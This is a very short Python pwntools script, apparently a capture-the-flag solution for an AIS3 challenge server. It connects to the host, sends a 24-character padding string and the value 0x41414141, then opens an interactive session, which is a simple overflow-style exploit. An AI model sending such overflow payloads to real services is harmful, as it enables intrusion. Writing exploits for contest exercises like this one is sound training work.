from pwn import *

r = remote('quiz.ais3.org', 56746)
r.recvuntil(':')
r.sendline('AAAAAAAAAAAAAAAAAAAAAAAA')
r.recvuntil(':')
r.sendline(str(0x41414141))
r.interactive()
r.close()
